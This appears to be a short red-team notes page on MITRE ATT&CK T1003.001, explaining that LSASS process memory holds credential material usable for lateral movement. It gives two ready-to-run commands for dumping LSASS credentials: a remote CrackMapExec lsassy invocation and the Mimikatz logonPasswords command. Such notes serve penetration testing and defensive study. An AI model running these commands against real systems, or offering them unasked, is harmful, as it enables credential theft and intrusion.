---
description: MITRE ATT&CK, Credential Access, Sub-technique T1003.001
---

# LSASS Memory

After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

### Dumping LSASS Memory

```bash
# Dumping LSASS remotely with CrackMapExec
crackmapexec smb $ip -u $username -p $password -M lsassy

# Dumping LSASS with Mimikatz
sekurlsa::logonPasswords
```

### References

{% embed url="https://attack.mitre.org/techniques/T1003/001/" %}
